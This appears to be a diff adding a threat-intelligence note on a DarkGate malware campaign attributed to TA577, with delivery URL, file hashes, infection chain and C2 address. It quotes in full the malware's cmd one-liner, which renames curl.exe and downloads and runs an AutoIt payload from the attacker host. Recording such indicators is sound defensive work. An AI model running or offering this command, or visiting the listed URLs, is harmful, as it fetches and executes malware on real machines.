@@ -1,0 +1,21 @@
+04.09.2023 | Darkgate | TA577
+
+*************************************************
+
+.url https://xavierliras.com/lgtv/?1
+.zip 88b5e4b1b533c398d790fbe974b2b369d72268069dcc64b53a742f4d1361c6bf
+.exe 74729d4569691daf72e23849e91461471411f551639663e11e1091a48790611e
+
+*************************************************
+
+url > zip > msi
+
+WScript.exe "C:\Users\Admin\AppData\Local\Temp\Test_395-13959.vbs
+
+cmd /c mkdir c:\omxg & cd /d c:\omxg & copy c:\windows\system32\curl.exe omxg.exe & omxg -H "User-Agent: curl" -o Autoit3.exe http://getldrrgoodgame.com:2351 & omxg -o ylixip.au3 http://getldrrgoodgame.com:2351/msiomxgnyqu & Autoit3.exe ylixip.au3
+
+*************************************************
+
+c2
+
+http://getldrrgoodgame.com:2351/omxgnyqu
